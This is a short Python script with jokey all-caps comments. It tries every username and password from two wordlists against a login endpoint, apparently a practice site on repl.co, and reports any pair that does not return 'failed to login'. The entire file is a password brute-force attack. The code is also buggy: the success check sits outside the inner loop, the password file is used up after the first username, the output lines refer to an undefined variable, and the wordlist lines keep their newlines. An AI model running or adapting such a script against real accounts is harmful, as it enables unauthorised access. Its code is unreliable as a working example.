import requests

#GET THE LINK
url = "https://requestswebsite.notanothercoder.repl.co/"

#FUNCITON FOR SENIG REQUIREST
def send_request(username, password):
    #SET PARAMETERS TO THINGY
    data = {
        "username" : username,
        "password" : password
    }

    #FULL SEND
    r = requests.get(url, data=data)

    #GIVE BAKC OUTPUT
    return r

#OPEN FIELS IWHT ALL THE STUFF
ufile = open('usernames.txt', 'r')
pfile = open('passwords.txt', 'r')

#NESTED FOR LOOP!!!!!!!
for username in ufile:
    for passwd in pfile:
        #FULL SEND 2 ELECTRIC BOOGALOO
        r = send_request(username, passwd)

    #IF IT FAILED
    if 'failed to login' in r.text.lower():
        #IT BE LIKE THAT
        print(f'tried {username}, {password} \n')
    #OTHERWISE
    else:
        #YOU DID IT
        print(f"Login found: {username}, {password}!\n")
        #GO HOME
        break

